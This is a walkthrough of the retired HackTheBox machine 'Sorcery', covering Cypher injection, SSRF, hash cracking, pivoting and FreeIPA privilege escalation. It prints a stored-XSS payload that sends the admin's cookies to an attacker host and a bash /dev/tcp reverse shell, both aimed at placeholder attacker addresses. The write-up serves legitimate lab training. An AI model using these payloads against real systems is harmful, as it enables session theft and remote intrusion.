# HackTheBox — Sorcery

**Platform:** HackTheBox | **OS:** Linux | **Difficulty:** Insane | **Status:** Retired  
**Category:** Web, Cryptography, Privilege Escalation  
**Tools Used:** Nmap, Burp Suite, Gitea, Ligolo-ng, Hashcat, pspy64, pem2john, strace

---

## Summary

Sorcery is an Insane-rated Linux machine requiring a multi-stage attack chain across web exploitation, source code analysis, internal network pivoting, and credential chaining. The path to user involves a Cypher injection in a Neo4j-backed store, SSRF to leak password hashes and a registration key, stored XSS to hijack an admin session, and remote code execution via a Kafka payload. Root requires chaining four separate privilege escalation techniques including screen dump credential leakage, strace inspection, and FreeIPA identity management abuse.

---

## Attack Chain Overview

```
Nmap → Gitea source code → Cypher Injection → SSRF → Hash leak
→ Seller account registration → Stored XSS → Admin session hijack
→ Kafka RCE → Container access → Ligolo-ng pivot → Encrypted SSH key
→ Xvfb screen dump → strace credential capture → FreeIPA abuse → Root
```

---

## 1. Reconnaissance

### Nmap Scan

```bash
nmap -sC -sV -oA initial 10.129.237.242
```

**Output:**

```text
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 9.6p1 Ubuntu 3ubuntu13.11
443/tcp open  ssl/http nginx 1.27.1
| ssl-cert: Subject: commonName=sorcery.htb
```

**Analysis:**

- **Port 22** — OpenSSH 9.6p1 on Ubuntu. No anonymous access.
- **Port 443** — HTTPS via nginx 1.27.1. TLS certificate issued for `sorcery.htb`, indicating virtual hosting. Self-signed certificate triggers browser warnings.

**Action:** Add `sorcery.htb` to `/etc/hosts`.

```bash
echo "10.129.237.242 sorcery.htb git.sorcery.htb" >> /etc/hosts
```

[Screenshot: nmap output showing ports 22 and 443]

---

## 2. Web Application Enumeration

### Main Application

Navigating to `https://sorcery.htb` presents a login page with three options: Username/Password, Passkey, and Register. A note on the page reads *"Check out our repo"* — a direct hint at an exposed Git service.

[Screenshot: sorcery.htb login page with passkey and register options]

### Gitea Discovery

Navigating to `https://git.sorcery.htb` reveals a self-hosted Gitea instance.

[Screenshot: Gitea landing page at git.sorcery.htb]

A public repository is visible without authentication:

```
nicole_sullivan/infrastructure
```

The repo is described as *"Sorcery Infrastructure"*, written in TypeScript, with a single commit labeled **"Final version"**. An open issue titled **"Finish replacing database queries"** hints at incomplete or vulnerable database logic.

[Screenshot: Gitea repo listing showing nicole_sullivan/infrastructure]

---

## 3. Source Code Review

Downloading the repository via the Gitea ZIP export reveals the full application stack.

```bash
# Bypass TLS verification to clone
GIT_SSL_NO_VERIFY=true git clone https://git.sorcery.htb/nicole_sullivan/infrastructure
```

### Repository Structure

```
infrastructure/
├── backend/          # Rust (Rocket framework)
├── backend-macros/
├── dns/
├── frontend/         # Node.js / Next.js
└── docker-compose.yml
```

### docker-compose.yml — Sensitive Environment Variables

Reviewing `docker-compose.yml` exposes the application's internal service layout:

- **DATABASE_HOST, DATABASE_USER, DATABASE_PASSWORD** — database credentials
- **Neo4j** — graph database used for the store feature
- **Kafka** — message queue
- **SITE_ADMIN_PASSWORD** — admin password placeholder

[Screenshot: docker-compose.yml showing environment variable keys]

### Backend Source — Neo4j Cypher Queries

The backend source under `src/` reveals that the store feature queries Neo4j using user-supplied input. The database queries are constructed without sanitisation, creating a **Cypher Injection** vulnerability — the equivalent of SQL injection but for graph databases.

[Screenshot: Rust backend source showing unsanitised Neo4j query construction]

### Registration Endpoint

The `/auth/register` endpoint requires a **Registration Key** labeled "only for sellers." This key must be obtained before account creation is possible.

---

## 4. Exploitation — Cypher Injection → SSRF → Hash Leak

### Identifying the Injection Point

The store search endpoint passes user input directly into a Cypher query against the Neo4j backend. By injecting Cypher syntax, it is possible to manipulate the query to make the server issue outbound HTTP requests — a **Server-Side Request Forgery (SSRF)** condition.

### Setting Up a Listener

```bash
python3 -m http.server 80
```

### Crafting the Cypher Injection Payload

The injected payload causes the Neo4j backend to issue an HTTP callback to the attacker's server, leaking internal data in the request parameters.

[Screenshot: Burp Suite showing the injected Cypher payload in the store search request]

### Capturing the Hash and Registration Key

The SSRF callback to the listener returns:

- An **Argon2 password hash** for an internal user
- The **seller registration key**

[Screenshot: Python HTTP server log showing the leaked hash and registration key in the callback URL]

### Cracking the Hash

```bash
hashcat -a 0 -m 16500 captured.hash /usr/share/wordlists/rockyou.txt
```

[Screenshot: hashcat output showing cracked plaintext password]

---

## 5. Seller Account Creation → Stored XSS → Admin Session Hijack

### Registering with the Leaked Key

Navigate to `/auth/register` and supply the registration key recovered via SSRF.

[Screenshot: Registration form with key field populated]

### Injecting a Stored XSS Payload

The seller dashboard allows product listings. The product name or description field is vulnerable to **stored XSS**. A payload is injected to steal the admin's session cookie when they review the listing.

```javascript
<script>
  fetch("http://YOUR_IP/?cookie=" + document.cookie);
</script>
```

[Screenshot: Seller product creation form with XSS payload in description field]

### Receiving the Admin Cookie

```bash
python3 -m http.server 80
```

When the admin reviews the new product listing, the XSS fires and the session token arrives at the listener.

[Screenshot: HTTP server log showing admin cookie arriving in the request]

### Accessing the Admin Debug Interface

Using the hijacked session token in Burp Suite (or browser storage), navigate to the restricted admin debug panel. This interface exposes direct interaction with internal services including Kafka.

[Screenshot: Admin debug panel accessible with stolen session cookie]

---

## 6. Remote Code Execution via Kafka

### Crafting the Kafka Payload

The debug interface sends messages to an internal Kafka topic. By crafting a malicious message, it is possible to trigger code execution inside the backend container.

```bash
# Reverse shell payload
bash -c 'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1'
```

### Setting Up the Listener

```bash
nc -lvnp 4444
```

[Screenshot: Netcat listener receiving reverse shell connection from the container]

---

## 7. Internal Pivoting — Ligolo-ng

### Establishing a Tunnel

With a foothold inside the container, use **Ligolo-ng** to pivot into the internal network and enumerate further services.

```bash
# On attacker machine
./proxy -selfcert

# On target container
./agent -connect YOUR_IP:11601 -ignore-cert
```

[Screenshot: Ligolo-ng establishing tunnel and showing discovered internal network range]

### FTP Discovery — Encrypted Private Key

Internal enumeration via the Ligolo tunnel reveals an FTP server. Anonymous or credential-based access exposes an **encrypted PEM private key**.

```bash
ftp INTERNAL_IP
get id_rsa.enc
```

### Cracking the Key

```bash
pem2john id_rsa.enc > key.hash
hashcat -a 0 key.hash /usr/share/wordlists/rockyou.txt
```

[Screenshot: hashcat cracking the PEM passphrase]

### SSH Access — User Flag

```bash
chmod 600 id_rsa.enc
ssh -i id_rsa.enc user@sorcery.htb
cat user.txt
```

[Screenshot: SSH session showing whoami output and user.txt captured]

**User flag captured.**

---

## 8. Privilege Escalation to Root

### Stage 1 — Xvfb Screen Dump

A running **Xvfb** (virtual framebuffer) instance writes screen dumps to disk. Converting the dump reveals a GUI session with credentials for a higher-privileged user.

```bash
# Locate the screen dump
find / -name "*.xwd" 2>/dev/null

# Convert to viewable image
convert screen.xwd screen.png
```

[Screenshot: Converted Xvfb screen dump showing credentials on screen]

### Stage 2 — strace Credential Capture

The higher-privileged account has limited `sudo` rights. Using `strace` to monitor running processes captures plaintext credentials for a third user being passed as arguments or through environment variables.

```bash
sudo strace -p TARGET_PID -e trace=read,write 2>&1 | grep -i pass
```

[Screenshot: strace output showing plaintext credentials in process arguments]

### Stage 3 — FreeIPA Abuse

Enumeration of the third account reveals **FreeIPA** (Red Hat Identity Management) activity. A password reset operation on an IPA-managed account provides access to a fourth account with broader group membership.

```bash
ipa user-mod TARGET_USER --password
```

### Stage 4 — Sudo Group Escalation

The fourth account can add itself to a sudo-enabled group and apply changes by restarting the relevant IPA service — granting full root access.

```bash
ipa group-add-member sudo --users=YOUR_USER
systemctl restart sssd

sudo su
cat /root/root.txt
```

[Screenshot: Terminal showing root shell — whoami returning root and root.txt captured]

**Root flag captured.**

---

## Lessons Learned

**Cypher Injection is SQL injection for graph databases.** Neo4j's Cypher query language is vulnerable to injection in the same way SQL is. Any unsanitised user input passed into a Cypher query should be treated as a critical finding in a real engagement.

**Source code repositories on internal services are high-value targets.** The Gitea instance exposed the entire application architecture — service layout, environment variable names, and vulnerable query patterns — before a single request was made to the application itself.

**Stored XSS in admin-reviewed content is a reliable session hijack vector.** Any content that administrators review creates an opportunity for stored XSS. This is a common pattern in bug bounty and real-world assessments.

**Credential chaining is common in enterprise environments.** The root path required four separate credential pivots — each one unlocked by the previous. In real engagements, this pattern (Xvfb → strace → IPA → sudo) mirrors Active Directory lateral movement and is a transferable skill set.

---

## References

- [Neo4j Cypher Injection — OWASP](https://owasp.org/www-community/attacks/Injection)
- [Ligolo-ng — Tunneling Tool](https://github.com/nicocha30/ligolo-ng)
- [FreeIPA Documentation](https://www.freeipa.org/page/Documentation)
- [HackTheBox — Sorcery](https://www.hackthebox.com/machines/sorcery)
